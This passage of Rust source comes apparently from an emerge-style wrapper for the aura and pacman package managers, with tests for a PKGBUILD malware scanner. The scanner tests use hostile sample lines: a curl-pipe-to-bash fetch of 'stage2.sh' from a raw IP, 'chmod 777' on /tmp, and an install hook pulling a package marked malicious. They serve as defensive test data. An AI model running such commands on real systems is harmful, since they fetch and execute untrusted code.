        assert_eq!(strip_version_operator("libc.so=6-64"), "libc.so");
        assert_eq!(strip_version_operator("bash"), "bash");
        assert_eq!(strip_version_operator("foo<=1.2"), "foo");
        assert_eq!(strip_version_operator("foo<1.2"), "foo");
    }

    #[test]
    fn parse_depends_on_basic() {
        let qi = "\
Name            : bash
Version         : 5.2.32-1
Description     : The GNU Bourne Again shell
Depends On      : readline  libc.so=6-64
Optional Deps   : None
Required By     : filesystem

Name            : coreutils
Version         : 9.5-1
Depends On      : glibc>=2.38  acl  attr
Required By     : base

Name            : filesystem
Version         : 2024.01-1
Depends On      : None
Required By     : None
";
        let deps = parse_depends_on_all(qi);
        for expect in ["readline", "libc.so", "glibc", "acl", "attr"] {
            assert!(deps.contains(expect), "missing: {}", expect);
        }
        assert_eq!(deps.len(), 5);
    }

    #[test]
    fn parse_depends_on_wrapped_continuation() {
        // Simulates pacman wrapping a long Depends On value onto a second,
        // indented line with no field label.
        let qi = "\
Name            : bigpkg
Version         : 1.0-1
Depends On      : dep-one  dep-two  dep-three
                  dep-four  dep-five
Required By     : None
";
        let deps = parse_depends_on_all(qi);
        for expect in ["dep-one", "dep-two", "dep-three", "dep-four", "dep-five"] {
            assert!(deps.contains(expect), "missing: {}", expect);
        }
        assert_eq!(deps.len(), 5);
    }

    #[test]
    fn parse_depends_on_none_and_missing_field() {
        let qi = "\
Name            : justapkg
Version         : 1.0-1
Depends On      : None
Required By     : None
";
        assert!(parse_depends_on_all(qi).is_empty());
    }

    #[test]
    fn atomic_arch_style_pkgbuild_and_install_flagged() {
        let pkgbuild = r#"
pkgname=totally-legit-tool
pkgver=1.2.3
pkgrel=1
install=totally-legit-tool.install
source=("https://github.com/foo/totally-legit-tool/archive/v$pkgver.tar.gz")
build() {
  cd "$pkgname-$pkgver"
  make
}
"#;
        let install_hook = r#"
post_install() {
  npm install atomic-lockfile
}
"#;
        let pkgbuild_findings = scan_pkgbuild_source(pkgbuild);
        assert!(pkgbuild_findings.is_empty(), "clean PKGBUILD should have no findings on its own");

        assert_eq!(parse_install_filename(pkgbuild), Some("totally-legit-tool.install".to_string()));

        let install_findings = scan_pkgbuild_source(install_hook);
        assert!(install_findings.iter().any(|f| f.message.contains("atomic-lockfile")));
        assert!(install_findings.iter().any(|f| f.severity == Severity::AtomicArch));
    }

    #[test]
    fn findings_carry_correct_line_numbers() {
        let src = "pkgname=foo\npkgver=1.0\nbuild() {\n  chmod 777 \"$pkgdir\"\n}\n";
        let findings = scan_pkgbuild_source(src);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].line, 4);
        assert_eq!(findings[0].severity, Severity::Suspicious);
    }

    #[test]
    fn known_malicious_package_is_atomic_arch_severity() {
        let src = "post_install() {\n  npm install atomic-lockfile\n}\n";
        let findings = scan_pkgbuild_source(src);
        // Hits both the exact-IOC check (AtomicArch) and the generic
        // foreign-package-manager heuristic (Suspicious) on the same line.
        assert!(findings.iter().any(|f| f.severity == Severity::AtomicArch && f.line == 2));
        assert!(findings.iter().any(|f| f.severity == Severity::Suspicious && f.line == 2));
    }

    #[test]
    fn malicious_pkgbuild_flagged() {
        let src = r#"
pkgname=evil
build() {
  curl -sSL http://185.220.101.5/stage2.sh | bash
  chmod 777 /tmp/evil
}
"#;
        let findings = scan_pkgbuild_source(src);
        assert_eq!(findings.len(), 3);
    }
}

/// Read one line from stdin, byte by byte, via the raw fd — deliberately
/// bypassing Rust's global `Stdin`, which wraps a shared `BufReader` and
/// will happily read *more* than one line's worth of bytes from the
/// underlying fd/pty in a single syscall, stashing the leftover in its own
/// internal buffer. That's invisible and harmless on its own, but this
/// tool always follows a "y/N, please confirm" read with spawning a child
/// process (`aura`/`pacman`) that inherits the same stdin and expects to
/// do its *own* interactive read right after (e.g. pacman's package-
/// conflict prompt) — any bytes the parent over-read are gone as far as
/// the OS and the child are concerned, so the child's read comes back
/// empty/EOF immediately, and its prompt gets silently declined with no
/// real chance for the user to answer. Reading strictly one byte at a time
/// via the raw fd guarantees we never consume more than our own line,
/// leaving the fd's read position exactly where the child needs it.
#[cfg(unix)]
fn read_line_raw() -> String {
    use std::os::unix::io::FromRawFd;
    let mut file = unsafe { std::fs::File::from_raw_fd(0) };
    let mut line = Vec::new();
    let mut byte = [0u8; 1];
    loop {
        match std::io::Read::read(&mut file, &mut byte) {
            Ok(0) => break, // EOF
            Ok(_) => {
                if byte[0] == b'\n' {
                    break;
                }
                line.push(byte[0]);
            }
            Err(_) => break,
        }
    }
    std::mem::forget(file); // don't close fd 0 out from under the process
    String::from_utf8_lossy(&line).trim_end_matches('\r').to_string()
}

#[cfg(not(unix))]
fn read_line_raw() -> String {
    let mut line = String::new();
    io::stdin().lock().read_line(&mut line).ok();
    line.trim_end().to_string()
}

/// Reset SIGPIPE to its default disposition (terminate, not panic).
///
/// Rust's stdout is fully buffered and treats a write error as fatal via
/// panic — but on Unix, the *first* symptom of a downstream reader closing
/// early (e.g. `| head -3`) is normally just a SIGPIPE that kills the
/// process quietly. Rust masks SIGPIPE by default (SIG_IGN) so that write()
/// returns EPIPE instead of killing the process, which is convenient for
/// libraries but means every plain `println!` in this codebase has to
/// handle that error or it panics — which is exactly what was happening.
/// Restoring the default disposition here makes `emerge --info | head -3`
/// behave like every other well-behaved Unix CLI: it just stops silently
/// when the reader goes away.
#[cfg(unix)]
fn reset_sigpipe() {
    extern "C" {
        fn signal(signum: i32, handler: usize) -> usize;
    }
    const SIGPIPE: i32 = 13;
    const SIG_DFL: usize = 0;
    unsafe {
        signal(SIGPIPE, SIG_DFL);
    }
}

#[cfg(not(unix))]
fn reset_sigpipe() {}

// ── @preserved-rebuild ──────────────────────────────────────────────────────
//
// There's no Portage-style preserved-libs tracking on Arch, so this doesn't
// literally port Gentoo's @preserved-rebuild set. What it does instead:
// collect every dependency every installed package declares (via
// `pacman -Qi`), hand the whole deduplicated list to `pacman -T` (which
// correctly understands provides/virtual packages, unlike a naive string
// diff against `pacman -Qq`), and offer to reinstall whatever comes back
// unsatisfied — deps that got removed out from under something, e.g. via
// `pacman -Rdd` or a provider package that stopped providing them.

/// Run `pacman -Qi` (info for every installed package) forced to the C
/// locale. Forcing the locale matters: pacman's field labels ("Depends
/// On", etc.) are gettext-translated, so on a system with e.g. LANG=uk_UA
/// they would NOT be the English strings this parser looks for. `LC_ALL=C`
/// guarantees English output regardless of the user's actual locale — the
/// standard trick for scripts that parse command output.
fn pacman_qi_all() -> Option<String> {
    let out = Command::new(PACMAN_BIN)
        .arg("-Qi")
        .env("LC_ALL", "C")
        .output()
        .ok()?;
    if !out.status.success() {
        return None;
    }
    Some(String::from_utf8_lossy(&out.stdout).to_string())
}

/// Strip a version-comparison operator/suffix off a dependency atom:
/// "glibc>=2.38" -> "glibc", "libc.so=6-64" -> "libc.so", "bash" -> "bash".
fn strip_version_operator(atom: &str) -> String {
    match atom.find(['<', '>', '=']) {
        Some(i) => atom[..i].to_string(),
        None => atom.to_string(),
    }
}

/// Parse every "Depends On" field out of a full `pacman -Qi` dump (one
/// block per installed package, blocks separated by a blank line), stripping
/// version operators and deduplicating. Handles wrapped/continuation lines:
/// pacman indents continuation lines to align under the value column, so
/// any line within a block that starts with several spaces and doesn't
/// itself look like a new "Label   : value" field is treated as more of the
/// same field's value.
fn parse_depends_on_all(qi_text: &str) -> HashSet<String> {
    let mut deps = HashSet::new();

    for block in qi_text.split("\n\n") {
        let mut capturing = false;
        for line in block.lines() {
            let leading_spaces = line.len() - line.trim_start().len();
            let looks_like_new_field = leading_spaces == 0 && line.contains(" : ");

            if looks_like_new_field {
                capturing = false;
                if let Some(rest) = line.strip_prefix("Depends On") {
                    if let Some(colon_idx) = rest.find(':') {
                        let value = rest[colon_idx + 1..].trim();
                        if value != "None" && !value.is_empty() {
                            for tok in value.split_whitespace() {
                                deps.insert(strip_version_operator(tok));
                            }
                        }
                        capturing = true;
                    }
                }
                continue;
            }

            if capturing && leading_spaces > 0 {
                for tok in line.trim().split_whitespace() {
                    deps.insert(strip_version_operator(tok));
                }
            } else {
                capturing = false;
            }
        }
    }

    deps
}

/// Ask pacman itself which of these atoms are actually unsatisfied right
/// now. `pacman -T` / `--deptest` is the built-in dependency-test tool —
/// unlike comparing against `pacman -Qq` by hand, it correctly resolves
/// provides/virtual packages, so a dep satisfied by a provider isn't
/// misreported as missing. Prints exactly the unsatisfied subset, one per
/// line, to stdout.
fn missing_via_pacman_t(deps: &[String]) -> Vec<String> {
    if deps.is_empty() {
        return Vec::new();
    }
    let out = Command::new(PACMAN_BIN)
        .arg("-T")
        .args(deps)
        .env("LC_ALL", "C")
        .output();
    match out {
        Ok(o) => String::from_utf8_lossy(&o.stdout)
            .lines()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect(),
        Err(_) => Vec::new(),
    }
}

/// `@preserved-rebuild`: scan every installed package's declared
/// dependencies, find the ones that aren't actually satisfied on the
/// system, and offer to reinstall them (`aura -S`, i.e. official repos —
/// a dependency that vanished is essentially always a repo package).
fn preserved_rebuild(pretend: bool, ask: bool) {
    println!("{} Checking installed packages for missing dependencies...", ">>>".green().bold());

    let qi = match pacman_qi_all() {
        Some(s) => s,
        None => {
            eprintln!(">>> Error: failed to query installed packages (pacman -Qi).");
            std::process::exit(1);
        }
    };

    let all_deps = parse_depends_on_all(&qi);
    if all_deps.is_empty() {
        println!(">>> No dependency information found.");
        return;
    }

    let mut deps_sorted: Vec<String> = all_deps.into_iter().collect();
    deps_sorted.sort();

    let missing = missing_via_pacman_t(&deps_sorted);

    if missing.is_empty() {
        println!();
        println!(">>> No problems with dependencies were found.");
        return;
    }

    println!();
    for m in &missing {
        println!("[{} {:<4}] {}", "ebuild".green(), "N".green().bold(), m.green().bold());
    }
    println!();
    println!("{}: {} missing dependenc{}", "Total".bold(), missing.len(), if missing.len() == 1 { "y" } else { "ies" });
    println!();

    if pretend {
        return;
    }

    print!("{} Reinstall the missing dependencies above? [y/N] ", ">>>".yellow().bold());
    io::stdout().flush().ok();
    let answer = read_line_raw();
    let confirmed = answer.trim().eq_ignore_ascii_case("y");

    if !confirmed {
        println!(">>> Aborted.");
        return;
    }

    // Our own y/N above already confirmed the *decision* to reinstall —
    // but --noconfirm also silently auto-declines any further prompt
    // pacman itself needs to raise (e.g. file conflicts, package
    // conflicts). Respect --ask like every other install path in this
    // tool does, so those prompts actually reach the user instead of
    // being auto-rejected.
    let mut args = vec!["-S"];
    if !ask { args.push("--noconfirm"); }
    run_cmd(AURA_BIN, &args, &missing);
}

fn main() {
    reset_sigpipe();

    // If invoked as "portageq" (symlink), act as the shim
    let argv: Vec<String> = std::env::args().collect();
    let invoked_as = std::path::Path::new(&argv[0])
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("");
    if invoked_as == "portageq" {
        portageq_shim(&argv);
        return;
    }

    let cli = Cli::parse();

    // Shell completion generation: no aura/pacman needed, no world.set
    // touched — this just prints a script to stdout. Handled before
    // check_binaries() so it also works in a clean chroot/build environment.
    if let Some(shell) = cli.gen_completions {
        let mut cmd = <Cli as clap::CommandFactory>::command();
        clap_complete::generate(shell, &mut cmd, "emerge", &mut io::stdout());
        return;
    }

    if cli.help {
        print_help();
        return;
    }

    if cli.version {
        println!("aura-emerge {}", env!("CARGO_PKG_VERSION"));
        return;
    }

    if cli.info {
        print_system_info();
        return;
    }

    check_binaries();

    if cli.aur && cli.only_repos {
        eprintln!(">>> Error: --aur and --only-repos are mutually exclusive.");
        std::process::exit(1);
    }

    // Detect @world / world in package list
    let has_world = cli.packages.iter()
        .any(|p| p == "@world");

    // Detect @preserved-rebuild set (Gentoo-flavored trigger for a
    // dependency-completeness check — see preserved_rebuild()).
    let has_preserved_rebuild = cli.packages.iter()
        .any(|p| p == "@preserved-rebuild");

    // Build validated package list (excluding world/preserved-rebuild aliases)
    let target_pkgs: Vec<String> = validate_packages(
        &cli.packages
            .iter()
            .filter(|p| *p != "@world" && *p != "@preserved-rebuild")
            .cloned()
            .collect::<Vec<_>>(),
    );

    // 0. @preserved-rebuild: a standalone action, checked before search/
    //    install so `emerge @preserved-rebuild` (with no other packages)
    //    just runs the check-and-offer-to-fix flow.
    if has_preserved_rebuild {
        preserved_rebuild(cli.pretend, cli.ask);
        return;
    }

    // 1. Search (including --searchdesc)
    if cli.search || cli.searchdesc {
        if target_pkgs.is_empty() {
            eprintln!(">>> Error: Specify search term.");
            std::process::exit(1);
        }

        if cli.searchdesc {
            // Search descriptions: pacman -Ss for official, aura -As for AUR
            println!("{} Searching descriptions for '{}'...", ">>>".green().bold(), target_pkgs.join(" "));
            run_cmd(AURA_BIN, &["-Ss"], &target_pkgs);
            if !cli.only_repos {
                println!();
                println!("{} Searching {} descriptions for '{}'...", ">>>".green().bold(), "AUR".cyan().bold(), target_pkgs.join(" "));
                run_cmd(AURA_BIN, &["-As"], &target_pkgs);
            }
            return;
        }

        if cli.verbose {
            if cli.aur {
                println!("{} Searching in {} for '{}'...", ">>>".green().bold(), "AUR".cyan().bold(), target_pkgs.join(" "));
                run_cmd(AURA_BIN, &["-Ai"], &target_pkgs);
            } else {
                let found = probe_official(&target_pkgs).is_some();
                if found {
                    println!("{} Searching for '{}'...", ">>>".green().bold(), target_pkgs.join(" "));
                    run_cmd(AURA_BIN, &["-Si"], &target_pkgs);
                } else if cli.only_repos {
                    println!(
                        ">>> '{}' not found in official repos. (--only-repos set, not searching AUR)",
                        target_pkgs.join(" ")
                    );
                } else {
                    println!(
                        ">>> '{}' not found in official repos, searching AUR...",
                        target_pkgs.join(" ")
                    );
                    run_cmd(AURA_BIN, &["-Ai"], &target_pkgs);
                }
            }
        } else if cli.aur {
            println!("{} Searching in {} for '{}'...", ">>>".green().bold(), "AUR".cyan().bold(), target_pkgs.join(" "));
            run_cmd(AURA_BIN, &["-As"], &target_pkgs);
        } else {
            println!("{} Searching for '{}'...", ">>>".green().bold(), target_pkgs.join(" "));
            run_cmd(AURA_BIN, &["-Ss"], &target_pkgs);
            if !cli.only_repos {
                println!();
                println!("{} Searching in {} for '{}'...", ">>>".green().bold(), "AUR".cyan().bold(), target_pkgs.join(" "));
                run_cmd(AURA_BIN, &["-As"], &target_pkgs);
            }
        }
        return;
    }

    // 2. Sync — sync DB, then continue to install if packages given
    if cli.sync {
        let sync_flag = if cli.refresh { "-Syy" } else { "-Sy" };
        println!("{} Syncing package databases{}...",
            ">>>".green().bold(),
            if cli.refresh { " (force refresh)" } else { "" }
        );
        run_cmd(AURA_BIN, &[sync_flag], &[]);
        if target_pkgs.is_empty() && !has_world {
            return;
        }
        // fall through to update or install
    }

    // --regen: regenerate package metadata cache
    if cli.regen {
        println!("{} Regenerating package metadata cache...", ">>>".green().bold());
        run_cmd(SUDO_BIN, &[PACMAN_BIN, "-Fy"], &[]);
        return;
    }

    // --regen-world: re-resolve repo prefixes for all entries in world.set
    if cli.regen_world {
        regen_world_set();
        return;
    }

    // --prune: remove installed packages not in world.set
    if cli.prune {
        println!("{} Pruning packages not in world.set...", ">>>".green().bold());
        if !is_safe_path(WORLD_SET_FILE) {
            eprintln!(">>> Warning: {} is a symlink — refusing to read", WORLD_SET_FILE);
            std::process::exit(1);
        }
        let world_bare: HashSet<String> = match fs::File::open(WORLD_SET_FILE) {
            Ok(file) => io::BufReader::new(file)
                .lines()
                .map_while(Result::ok)
                .filter(|l| !l.trim().is_empty())
                .map(|l| l.trim().split('/').last().unwrap_or("").to_string())
                .collect(),
            Err(_) => {
                eprintln!(">>> Error: cannot open world.set");
                std::process::exit(1);
            }
        };
        let output = Command::new(PACMAN_BIN)
            .args(["-Qeq"])
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .output();
        match output {
            Ok(out) => {
                let installed: Vec<String> = String::from_utf8_lossy(&out.stdout)
                    .lines()
                    .map(|l| l.trim().to_string())
                    .filter(|l| !l.is_empty())
                    .collect();
                let to_remove: Vec<String> = installed
                    .into_iter()
                    .filter(|p| !world_bare.contains(p))
                    .collect();
                if to_remove.is_empty() {
                    println!(">>> Nothing to prune. All explicitly installed packages are in world.set.");
                    return;
                }
                println!();
                for p in &to_remove {
                    println!("[{}] {}", "unmerge".red().bold(), p);
                }
                println!();
                println!("Total: {} package(s) to prune", to_remove.len());
                println!();
                if cli.pretend { return; }
                let mut args = vec![PACMAN_BIN, "-Rns"];
                if !cli.ask { args.push("--noconfirm"); }
                run_cmd(SUDO_BIN, &args, &to_remove);
            }
            Err(_) => eprintln!(">>> Error: failed to list installed packages"),
        }
        return;
    }

    // --resume: re-run last interrupted aura/pacman operation
    if cli.resume {
        println!(">>> Attempting to resume last interrupted transaction...");
        let mut args = vec!["-S", "--needed"];
        if cli.skipfirst {
            // Can't truly replicate portage skipfirst on pacman, so we warn
            println!(">>> Note: --skipfirst is not directly supported; resuming normally.");
        }
        if !cli.ask { args.push("--noconfirm"); }
        run_cmd(SUDO_BIN, &[PACMAN_BIN, "--noconfirm", "-Syu"], &[]);
        return;
    }

    // --select: explicitly add packages to world.set without installing
    if cli.select {
        if target_pkgs.is_empty() {
            eprintln!(">>> Error: specify packages to add to world.set.");
            std::process::exit(1);
        }
        for p in &target_pkgs {
            println!(">>> Selecting {} into world.set...", p);
        }
        add_to_world_set(&target_pkgs, None);
        return;
    }

    // --deselect: remove packages from world.set without unmerging
    if cli.deselect {
        if target_pkgs.is_empty() {
            eprintln!(">>> Error: specify packages to deselect from world.set.");
            std::process::exit(1);
        }
        for p in &target_pkgs {
            println!(">>> Deselecting {} from world.set (package stays installed)...", p);
        }
        remove_from_world_set(&target_pkgs);
        return;
    }

    // 3a. Mixed: specific pkgs + @world (e.g. emerge nano @world)
    //     Install the named packages first, then fall through to world update
    if has_world && !target_pkgs.is_empty() && !cli.update {
        println!("{} Installing specified packages before @world update...", ">>>".green().bold());
        // will fall through to install block below, then world update happens separately
    }

    // 3. Update @world — triggered by -u or bare @world/world
    if cli.update || has_world {
        println!(">>> Calculating dependencies... done!");
        println!();
        println!(">>> Upgrading system (official repos)...");
        let mut s_args = vec!["-Syu"];
        if cli.verbose {
            s_args.push("--verbose");
        }
        run_cmd(AURA_BIN, &s_args, &[]);

        println!(">>> Upgrading AUR packages...");
        run_cmd(AURA_BIN, &["-Au"], &[]);

        println!();
        println!("{} Auto-cleaning packages...", ">>>".green().bold());
        return;
    }

    // 4. Depclean (orphans)
    if cli.depclean {
        println!(">>> Calculating dependencies... done!");
        println!(">>> Checking for orphaned packages...");

        match Command::new(PACMAN_BIN).arg("-Qtdq").output() {
            Ok(out) => {
                let orphans_str = String::from_utf8_lossy(&out.stdout);
                let orphans: Vec<String> = orphans_str
                    .lines()
                    .map(|s| s.trim().to_string())
                    .filter(|s| !s.is_empty())
                    .collect();

                if orphans.is_empty() {
                    println!();
                    println!(">>> No orphaned packages were found on your system.");
                    return;
                }

                println!();
                for o in &orphans {
                    println!("[{}] {}", "unmerge".red().bold(), o);
                }
                println!();
                println!("Total: {} orphaned package(s) to remove", orphans.len());
                println!();

                let mut pacman_args = vec![PACMAN_BIN, "-Rns"];
                if cli.pretend {
                    pacman_args.push("--print");
                }
                if !cli.ask && !cli.pretend {
                    pacman_args.push("--noconfirm");
                }
                run_cmd(SUDO_BIN, &pacman_args, &orphans);
            }
            Err(_) => eprintln!(">>> Error: Failed to check for orphans."),
        }
        return;
    }

    // 5. Unmerge (remove)
    if cli.unmerge {
        if target_pkgs.is_empty() {
            eprintln!(">>> Error: Specify packages to remove.");
            std::process::exit(1);
        }

        println!("{} This action can remove important packages! In order to be safer, use", " *".yellow().bold());
        println!("{} `emerge -p --depclean <atom>` to check for reverse dependencies before", " *".yellow().bold());
        println!("{} removing packages.", " *".yellow().bold());
        println!();
        println!("{} These are the packages that would be unmerged:", ">>>".green().bold());
        println!();
        for p in &target_pkgs {
            let bare = p.split('/').last().unwrap_or(p);
            let ver = {
                let out = std::process::Command::new(PACMAN_BIN)
                    .args(["-Q", bare]).env("LC_ALL", "C")
                    .stdout(std::process::Stdio::piped())
                    .stderr(std::process::Stdio::null())
                    .output();
                match out {
                    Ok(o) if o.status.success() =>
                        String::from_utf8_lossy(&o.stdout)
                            .split_whitespace().nth(1)
                            .unwrap_or("?").to_string(),
                    _ => "?".to_string(),
                }
            };
            let repo = get_pkg_repo(bare).unwrap_or_default();
            let atom = if repo.is_empty() { bare.to_string() } else { format!("{}/{}", repo, bare) };
            println!(" {}", atom);
            println!("    selected: {}", ver);
            println!("   protected: none");
            println!("     omitted: none");
        }
        println!();
        println!("{} {} packages are slated for removal.", ">>>".green().bold(), "'Selected'".yellow().bold());
        println!("{} {} and {} packages will not be removed.", ">>>".green().bold(), "'Protected'".green(), "'omitted'".cyan());
        println!();
        println!("{} Unmerging {}...", ">>>".green().bold(), target_pkgs.join(", ").bold());

        let mut aura_args = vec!["-R"];
        if cli.pretend {
            aura_args.push("--print");
        }
        if !cli.ask && !cli.pretend {
            aura_args.push("--noconfirm");
        }
        if cli.verbose {
            aura_args.push("--verbose");
        }

        let success = run_cmd(AURA_BIN, &aura_args, &target_pkgs);
        if success && !cli.pretend {
            remove_from_world_set(&target_pkgs);
        }
        return;
    }

    // 6. Install
    if !target_pkgs.is_empty() {
        let mut base_args: Vec<&str> = Vec::new();
        if !cli.ask && !cli.pretend {
            base_args.push("--noconfirm");
        }
        if cli.oneshot {
            base_args.push("--asdeps");
        }
        if cli.noreplace {
            base_args.push("--needed");
        }

        let mut success: bool;
        let mut installed_infos: Vec<PkgInfo> = Vec::new();

        if cli.abs {
            success = abs_install(&target_pkgs, cli.pretend, cli.ask, cli.oneshot, cli.skippgp, cli.edit, cli.autopgp);
        } else if cli.aur {
            let pkg_infos = resolve_aur(&target_pkgs);
            print_emerge_plan(&pkg_infos);
            if cli.pretend { return; }
            print_emerge_emerging(&pkg_infos);
            scan_aur_pkgbuilds_or_abort(&target_pkgs);
            let mut aur_args = vec!["-A"];
            aur_args.extend(&base_args);
            if cli.edit { aur_args.push("--hotedit"); }
            success = run_cmd(AURA_BIN, &aur_args, &target_pkgs);
            if success { installed_infos = pkg_infos; }
        } else {
            // Probe official repos in a way that's safe against partial matches:
            // a single unmatched name no longer drags every other package into
            // an AUR search.
            let (official_infos, missing) = probe_official_split(&target_pkgs);

            if missing.is_empty() {
                // Everything found in official repos.
                print_emerge_plan(&official_infos);
                if cli.pretend { return; }
                print_emerge_emerging(&official_infos);
                let mut off_args = vec!["-S"];
                if cli.verbose { off_args.push("--verbose"); }
                off_args.extend(&base_args);
                success = run_cmd(AURA_BIN, &off_args, &target_pkgs);
                if success { installed_infos = official_infos; }
            } else if cli.only_repos {
                // --only-repos: never touch the AUR. Unresolved names are
                // skipped (with a warning) rather than aborting the whole
                // request — packages that *were* found officially still get
                // installed, same as e.g. `pacman -S` reporting "target not
                // found" for one name without refusing the rest.
                eprintln!(
                    ">>> Warning: --only-repos is set; the following package(s) were not \
                    found in official repos and will be skipped (AUR was not searched):"
                );
                for m in &missing {
                    eprintln!("    {}", m);
                }

                if official_infos.is_empty() {
                    eprintln!(">>> Error: no requested packages were found in official repos.");
                    std::process::exit(1);
                }

                print_emerge_plan(&official_infos);
                if cli.pretend {
                    // Not everything could be resolved — still exit non-zero
                    // so scripts can detect the partial result.
                    std::process::exit(1);
                }
                print_emerge_emerging(&official_infos);

                let official_names: Vec<String> =
                    official_infos.iter().map(|p| p.name.clone()).collect();
                let mut off_args = vec!["-S"];
                if cli.verbose { off_args.push("--verbose"); }
                off_args.extend(&base_args);
                let off_success = run_cmd(AURA_BIN, &off_args, &official_names);
                if off_success {
                    installed_infos = official_infos;
                }
                // Even on a clean install of the found packages, some
                // requested names were never resolved — surface that as an
                // overall failure/non-zero exit. The tail below still
                // credits world.set / prints "Completed" for whatever did
                // succeed, based on installed_infos.
                success = false;
            } else if official_infos.is_empty() {
                // Nothing found officially at all — search AUR for everything.
                println!(
                    ">>> Not found in official repos. Searching AUR for '{}'...",
                    missing.join(", ")
                );
                let pkg_infos = resolve_aur(&missing);
                print_emerge_plan(&pkg_infos);
                if cli.pretend { return; }
                print_emerge_emerging(&pkg_infos);
                scan_aur_pkgbuilds_or_abort(&missing);
                let mut aur_args = vec!["-A"];
                aur_args.extend(&base_args);
                if cli.edit { aur_args.push("--hotedit"); }
                success = run_cmd(AURA_BIN, &aur_args, &missing);
                if success { installed_infos = pkg_infos; }
            } else {
                // Mixed case: some packages are official, some need the AUR.
                println!(
                    ">>> Not found in official repos: '{}'. Searching AUR...",
                    missing.join(", ")
                );
                let aur_infos = resolve_aur(&missing);
                let mut all_infos = official_infos.clone();
                all_infos.extend(aur_infos.clone());
                print_emerge_plan(&all_infos);
                if cli.pretend { return; }
                print_emerge_emerging(&all_infos);

                let official_names: Vec<String> =
                    official_infos.iter().map(|p| p.name.clone()).collect();
                let mut off_args = vec!["-S"];
                if cli.verbose { off_args.push("--verbose"); }
                off_args.extend(&base_args);
                success = run_cmd(AURA_BIN, &off_args, &official_names);
                if success {
                    installed_infos.extend(official_infos);
                }

                scan_aur_pkgbuilds_or_abort(&missing);
                let mut aur_args = vec!["-A"];
                aur_args.extend(&base_args);
                if cli.edit { aur_args.push("--hotedit"); }
                let aur_success = run_cmd(AURA_BIN, &aur_args, &missing);
                if aur_success {
                    installed_infos.extend(aur_infos);
                } else {
                    success = false;
                }
            }
        }

        if !cli.pretend {
            if !installed_infos.is_empty() {
                print_emerge_completed(&installed_infos);
            }

            if !cli.oneshot {
                if cli.abs {
                    // abs_install() doesn't populate installed_infos (single
                    // build source, no partial-success case to track).
                    if success {
                        println!("{} Auto-cleaning packages...", ">>>".green().bold());
                        add_to_world_set(&target_pkgs, Some("abs"));
                    }
                } else if !installed_infos.is_empty() {
                    println!("{} Auto-cleaning packages...", ">>>".green().bold());
                    // Record only what actually got installed, with the
                    // correct repo prefix per package. This matters for a
                    // mixed official+AUR install where one half can succeed
                    // while the other fails — we must not lose track of the
                    // half that worked, and must not force an "aur" prefix
                    // onto an official package or vice versa.
                    let official_names: Vec<String> = installed_infos.iter()
                        .filter(|p| p.repo != "aur")
                        .map(|p| p.name.clone())
                        .collect();
                    let aur_names: Vec<String> = installed_infos.iter()
                        .filter(|p| p.repo == "aur")
                        .map(|p| p.name.clone())
                        .collect();
                    if !official_names.is_empty() {
                        add_to_world_set(&official_names, None);
                    }
                    if !aur_names.is_empty() {
                        add_to_world_set(&aur_names, Some("aur"));
                    }
                }
            }

            if !success {
                eprintln!(">>> Warning: not all requested packages were installed successfully.");
                std::process::exit(1);
            }
        }
    }
}

// ── world.set ─────────────────────────────────────────────────────────────────

/// Re-resolve repository prefixes for every package in world.set.
/// Reads current entries, calls get_pkg_repo() for each, rewrites the file.
/// Useful after locale fixes, repo migrations, or manual edits.
fn regen_world_set() {
    println!("{} Regenerating world.set repository prefixes...", ">>>".green().bold());

    if !is_safe_path(WORLD_SET_FILE) {
        eprintln!(">>> Warning: {} is a symlink — refusing to modify", WORLD_SET_FILE);
        std::process::exit(1);
    }

    let entries: Vec<String> = match fs::File::open(WORLD_SET_FILE) {
        Ok(file) => io::BufReader::new(file)
            .lines()
            .map_while(Result::ok)
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty())
            .collect(),
        Err(_) => {
            eprintln!(">>> Error: cannot open {}", WORLD_SET_FILE);
            std::process::exit(1);
        }
    };

    let mut updated: Vec<String> = Vec::new();
    let mut changed = 0usize;

    for entry in &entries {
        let bare = entry.split('/').last().unwrap_or(entry);
        let new_entry = pkg_world_entry(bare, None);
        if &new_entry != entry {
            println!("  {} -> {}", entry, new_entry);
            changed += 1;
        }
        updated.push(new_entry);
    }

    if changed == 0 {
        println!("{} world.set is already up to date.", ">>>".green().bold());
        return;
    }

    updated.sort();
    write_world_set(&updated);
    println!("{} world.set updated ({} entries changed).", ">>>".green().bold(), changed);
}

fn add_to_world_set(packages: &[String], forced_prefix: Option<&str>) {
    println!("{} Adding to world.set...", ">>>".green().bold());

    if !is_safe_path(WORLD_SET_FILE) {
        eprintln!(">>> Warning: {} is a symlink — refusing to read", WORLD_SET_FILE);
        return;
    }

    // current_set keyed by bare package name → full "repo/name" or "name" entry
    let mut current_set: std::collections::HashMap<String, String> = std::collections::HashMap::new();
    if let Ok(file) = fs::File::open(WORLD_SET_FILE) {
        for line in io::BufReader::new(file).lines().map_while(Result::ok) {
            let trimmed = line.trim().to_string();
            if !trimmed.is_empty() && validate_pkg(&trimmed) {
                // bare name is the part after the last '/'
                let bare = trimmed.split('/').last().unwrap_or(&trimmed).to_string();
                current_set.insert(bare, trimmed);
            }
        }
    }

    let mut changed = false;
    for pkg in packages {
        let bare = pkg.split('/').last().unwrap_or(pkg).to_string();
        let entry = pkg_world_entry(&bare, forced_prefix);
        // Always overwrite: re-resolves repo on every install so stale entries
        // (e.g. "aur/nano" left from a locale-parsing bug) get corrected.
        let stale = current_set.get(&bare).map(|e| e != &entry).unwrap_or(true);
        if stale {
            current_set.insert(bare, entry);
            changed = true;
        }
    }

    if !changed { return; }

    let mut sorted: Vec<String> = current_set.into_values().collect();
    sorted.sort();
    write_world_set(&sorted);
}

fn remove_from_world_set(packages: &[String]) {
    println!(">>> Removing from world.set...");

    if !is_safe_path(WORLD_SET_FILE) {
        eprintln!(">>> Warning: {} is a symlink — refusing to read", WORLD_SET_FILE);
        return;
    }

    // key = bare name, value = full entry
    let mut current_set: std::collections::HashMap<String, String> = std::collections::HashMap::new();
    if let Ok(file) = fs::File::open(WORLD_SET_FILE) {
        for line in io::BufReader::new(file).lines().map_while(Result::ok) {
            let trimmed = line.trim().to_string();
            if !trimmed.is_empty() && validate_pkg(&trimmed) {
                let bare = trimmed.split('/').last().unwrap_or(&trimmed).to_string();
                current_set.insert(bare, trimmed);
            }
        }
    }

    let mut changed = false;
